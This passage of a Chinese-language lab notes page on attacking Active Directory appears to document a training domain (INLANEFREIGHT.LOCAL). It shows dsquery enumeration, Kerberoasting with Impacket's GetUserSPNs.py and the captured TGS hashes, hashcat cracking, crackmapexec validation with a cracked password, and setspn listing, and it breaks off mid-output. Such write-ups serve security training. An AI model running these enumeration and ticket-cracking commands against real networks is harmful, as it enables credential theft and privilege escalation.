Dillard,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Louis Bradford,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Sonya Gage,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Alba Sanchez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Daniel Branch,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Christopher Cruz,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Nicole Johnson,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Mary Holliday,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Michael Shoemaker,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Arlene Slater,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Kelsey Prentiss,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br></pre></td></tr></table></figure><p>查看禁用用户的描述字段</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery user <span class="literal">-disabled</span> | dsget user <span class="literal">-memberof</span> | findstr <span class="string">&quot;Administrators&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery user <span class="literal">-disabled</span> | dsget user <span class="literal">-desc</span></span><br></pre></td></tr></table></figure><h4 id="computers"><a href="#computers" class="headerlink" title="computers"></a>computers</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery computer</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=MAINLON,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=CISERVER,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=INDEX-DEV-LON,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=SQL-0253,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0615,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0616,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0617,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0618,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0619,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0620,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0621,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0622,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0623,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=LON-0455,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=LON-0456,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=LON-0457,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=LON-0458,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br></pre></td></tr></table></figure><h4 id="wildcard"><a href="#wildcard" class="headerlink" title="wildcard"></a>wildcard</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery * <span class="string">&quot;CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Cert Publishers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Guests,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Group Policy Creator Owners,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=RAS and IAS Servers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Allowed RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Denied RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Enterprise Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Cloneable Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Enterprise Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=DnsAdmins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=DnsUpdateProxy,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h4 id="users-filter-PASSWD-NOTREQD"><a href="#users-filter-PASSWD-NOTREQD" class="headerlink" title="users filter (PASSWD_NOTREQD)"></a>users filter (PASSWD_NOTREQD)</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery * <span class="literal">-filter</span> <span class="string">&quot;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))&quot;</span> <span class="literal">-attr</span> distinguishedName userAccountControl</span><br><span class="line"></span><br><span class="line">  distinguishedName                                                                              userAccountControl</span><br><span class="line">  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    <span class="number">66082</span></span><br><span class="line">  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      <span class="number">66080</span></span><br><span class="line">  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    <span class="number">66080</span></span><br><span class="line">  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    <span class="number">66080</span></span><br><span class="line">  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           <span class="number">546</span></span><br><span class="line">  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           <span class="number">544</span></span><br><span class="line">  CN=LOGISTICS<span class="variable">$</span>,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               <span class="number">2080</span></span><br><span class="line">  CN=FREIGHTLOGISTIC<span class="variable">$</span>,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        </span><br></pre></td></tr></table></figure><h4 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery * <span class="literal">-filter</span> <span class="string">&quot;(userAccountControl:1.2.840.113556.1.4.803:=8192)&quot;</span> <span class="literal">-limit</span> <span class="number">5</span> <span class="literal">-attr</span> sAMAccountName</span><br><span class="line"></span><br><span class="line"> sAMAccountName</span><br><span class="line"> ACADEMY<span class="literal">-EA-DC01</span><span class="variable">$</span></span><br></pre></td></tr></table></figure><hr><h1 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h1><p>Kerberoasting 是 Active Directory 环境中的一种横向移动&#x2F;权限提升技术。此攻击针对<a href="https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names">服务主体名称 (SPN)</a>帐户。SPN 是 Kerberos 用来将服务实例映射到服务在其上下文中运行的服务帐户的唯一标识符。域帐户通常用于运行服务，以克服内置帐户（如<code>NT AUTHORITY\LOCAL SERVICE</code>）的网络身份验证限制。任何域用户都可以为同一域中的任何服务帐户请求 Kerberos 票证。如果允许跨信任边界进行身份验证，这也可以跨林信任进行。执行 Kerberoasting 攻击所需的只是帐户的明文密码（或 NTLM Hash）、域用户帐户上下文中的 shell 或加入域的主机上的 SYSTEM 级别访问权限。</p><blockquote><p>执行 Kerberoasting 攻击的先决条件是域用户凭据（如果使用 Impacket，则为明文或 NTLM Hash）、域用户上下文中的 shell 或 SYSTEM 等帐户。一旦拥有此级别的访问权限，就可以开始了。还必须知道域中的哪个主机是域控制器，以便查询它。</p></blockquote><h2 id="GetUserSPNs-py-From-Linux"><a href="#GetUserSPNs-py-From-Linux" class="headerlink" title="GetUserSPNs.py - From Linux"></a>GetUserSPNs.py - From Linux</h2><p><code>-request</code> 提取所有 TGS 票证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request </span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation </span><br><span class="line">---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------</span><br><span class="line">backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  &lt;never&gt;               </span><br><span class="line">sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  &lt;never&gt;               </span><br><span class="line">MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  &lt;never&gt;               </span><br><span class="line">MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  &lt;never&gt;               </span><br><span class="line">MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  &lt;never&gt;               </span><br><span class="line">adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  &lt;never&gt;               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca6bf2f07ed3d3bc209e9a6ff0445cab89923b26a01879a53249c5f0a8c4bb41f0ea1b1196c322640d37ac064ebe3755ce888947da98b5707e6b06cbf679db1e7bbbea7d10c36d27f976d3f9793895fde20d3199411a90c528a51c91d6119cb5835bd29457887dd917b6c621b91c2627b8dee8c2c16619dc2a7f6113d2e215aef48e9e4bba8deff329a68666976e55e6b3af0cb8184e5ea6c8c2060f8304bb9e5f5d930190e08d03255954901dc9bb12e53ef87ed603eb2247d907c3304345b5b481f107cefdb4b01be9f4937116016ef4bbefc8af2070d039136b79484d9d6c7706837cd9ed4797ad66321f2af200bba66f65cac0584c42d900228a63af39964f02b016a68a843a81f562b493b29a4fc1ce3ab47b934cbc1e29545a1f0c0a6b338e5ac821fec2bee503bc56f6821945a4cdd24bf355c83f5f91a671bdc032245d534255aac81d1ef318d83e3c52664cfd555d24a632ee94f4adeb258b91eda3e57381dba699f5d6ec7b9a8132388f2346d33b670f1874dfa1e8ee13f6b3421174a61029962628f0bc84fa0c3c6d7bbfba8f2d1900ef9f7ed5595d80edc7fc6300385f9aa6ce1be4c5b8a764c5b60a52c7d5bbdc4793879bfcd7d1002acbe83583b5a995cf1a4bbf937904ee6bb537ee00d99205ebf5f39c722d24a910ae0027c7015e6daf73da77af1306a070fdd50aed472c444f5496ebbc8fe961fee9997651daabc0ef0f64d47d8342a499fa9fb8772383a0370444486d4142a33bc45a54c6b38bf55ed613abbd0036981dabc88cc88a5833348f293a88e4151fbda45a28ccb631c847da99dd20c6ea4592432e0006ae559094a4c546a8e0472730f0287a39a0c6b15ef52db6576a822d6c9ff06b57cfb5a2abab77fd3f119caaf74ed18a7d65a47831d0657f6a3cc476760e7f71d6b7cf109c5fe29d4c0b0bb88ba963710bd076267b889826cc1316ac7e6f541cecba71cb819eace1e2e2243685d6179f6fb6ec7cfcac837f01989e7547f1d6bd6dc772aed0d99b615ca7e44676b38a02f4cb5ba8194b347d7f21959e3c41e29a0ad422df2a0cf073fcfd37491ac062df903b77a32101d1cb060efda284cae727a2e6cb890f4243a322794a97fc285f04ac6952aa57032a0137ad424d231e15b051947b3ec0d7d654353c41d6ad30c6874e5293f6e25a95325a3e164abd6bc205e5d7af0b642837f5af9eb4c5bca9040ab4b999b819ed6c1c4645f77ae45c0a5ae5fe612901c9d639392eaac830106aa249faa5a895633b20f553593e3ff01a9bb529ff036005ec453eaec481b7d1d65247abf62956366c0874493cf16da6ffb9066faa5f5bc1db5bbb51d9ccadc6c97964c7fe1be2fb4868f40b3b59fa6697443442fa5cebaaed9db0f1cb8476ec96bc83e74ebe51c025e14456277d0a7ce31e8848d88cbac9b57ac740f4678f71a300b5f50baa6e6b85a3b10a10f44ec7f708624212aeb4c60877322268acd941d590f81ffc7036e2e455e941e2cfb97e33fec5055284ae48204d</span><br><span class="line">$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$d0fb2166453e4f2483735b9005e15667dbfd40fc9f8b5028e4b510fc570f5086978371ecd81ba6790b3fa7ff9a007ee9040f0566f4aed3af45ac94bd884d7b20f87d45b51af83665da67fb394a7c2b345bff2dfe7fb72836bb1a43f12611213b19fdae584c0b8114fb43e2d81eeee2e2b008e993c70a83b79340e7f0a6b6a1dba9fa3c9b6b02adde8778af9ed91b2f7fa85dcc5d858307f1fa44b75f0c0c80331146dfd5b9c5a226a68d9bb0a07832cc04474b9f4b4340879b69e0c4e3b6c0987720882c6bb6a52c885d1b79e301690703311ec846694cdc14d8a197d8b20e42c64cc673877c0b70d7e1db166d575a5eb883f49dfbd2b9983dd7aab1cff6a8c5c32c4528e798237e837ffa1788dca73407aac79f9d6f74c6626337928457e0b6bbf666a0778c36cba5e7e026a177b82ed2a7e119663d6fe9a7a84858962233f843d784121147ef4e63270410640903ea261b04f89995a12b42a223ed686a4c3dcb95ec9b69d12b343231cccfd29604d6d777939206df4832320bdd478bda0f1d262be897e2dcf51be0a751490350683775dd0b8a175de4feb6cb723935f5d23f7839c08351b3298a6d4d8530853d9d4d1e57c9b220477422488c88c0517fb210856fb603a9b53e734910e88352929acc00f82c4d8f1dd783263c04aff6061fb26f3b7a475536f8c0051bd3993ed24ff22f58f7ad5e0e1856a74967e70c0dd511cc52e1d8c2364302f4ca78d6750aec81dfdea30c298126987b9ac867d6269351c41761134bc4be67a8b7646935eb94935d4121161de68aac38a740f09754293eacdba7dfe26ace6a4ea84a5b90d48eb9bb3d5766827d89b4650353e87d2699da312c6d0e1e26ec2f46f3077f13825764164368e26d58fc55a358ce979865cc57d4f34691b582a3afc18fe718f8b97c44d0b812e5deeed444d665e847c5186ad79ae77a5ed6efab1ed9d863edb36df1a5cd4abdbf7f7e872e3d5fa0bf7735348744d4fc048211c2e7973839962e91db362e5338da59bc0078515a513123d6c5537974707bdc303526437b4a4d3095d1b5e0f2d9db1658ac2444a11b59ddf2761ce4c1e5edd92bcf5cbd8c230cb4328ff2d0e2813b4654116b4fda929a38b69e3f9283e4de7039216f18e85b9ef1a59087581c758efec16d948accc909324e94cad923f2487fb2ed27294329ed314538d0e0e75019d50bcf410c7edab6ce11401adbaf5a3a009ab304d9bdcb0937b4dcab89e90242b7536644677c62fd03741c0b9d090d8fdf0c856c36103aedfd6c58e7064b07628b58c3e086a685f70a1377f53c42ada3cb7bb4ba0a69085dec77f4b7287ca2fb2da9bcbedc39f50586bfc9ec0ac61b687043afa239a46e6b20aacb7d5d8422d5cacc02df18fea3be0c0aa0d83e7982fc225d9e6a2886dc223f6a6830f71dabae21ff38e1722048b5788cd23ee2d6480206df572b6ba2acfe1a5ff6bee8812d585eeb4bc8efce92fd81aa0a9b57f37bf3954c26afc98e15c5c90747948d6008c80b620a1ec54ded2f3073b4b09ee5cc233bf7368427a6af0b1cb1276ebd85b45a30</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!</span><br></pre></td></tr></table></figure><h2 id="Semi-Manual-From-Windows"><a href="#Semi-Manual-From-Windows" class="headerlink" title="Semi Manual - From Windows"></a>Semi Manual - From Windows</h2><h3 id="setspn-exe"><a href="#setspn-exe" class="headerlink" title="setspn.exe"></a>setspn.exe</h3><p>Windows 内置的<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)">setspn</a>二进制文件枚举域中的 SPN。</p><p>枚举 SPN</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">setspn.exe</span> -<span class="title">Q</span> */*</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Checking</span> <span class="title">domain</span> <span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01</span>,<span class="title">OU</span>=<span class="title">Domain</span> <span class="title">Controllers</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">exchangeAB</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01</span></span></span><br><span class="line"><span class="function">        <span class="title">exchangeAB</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">TERMSRV</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01</span></span></span><br><span class="line"><span class="function">        <span class="title">TERMSRV</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Dfsr</span>-12<span class="title">F9A27C</span>-<span class="title">BF97</span>-4787-9364-<span class="title">D31B6C55EB04</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">ldap</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span>/<span class="title">ForestDnsZones.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">ldap</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span>/<span class="title">DomainDnsZones.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">BACKUPAGENT</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">backupjob</span>/<span class="title">veam001.inlanefreight.local</span></span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">SOLARWINDSMONITOR</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">sts</span>/<span class="title">inlanefreight.local</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">sqlprod</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">MSSQLSvc</span>/<span class="title">SPSJDB.inlanefreight.local</span>:1433</span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">sqlqa</span>,<span 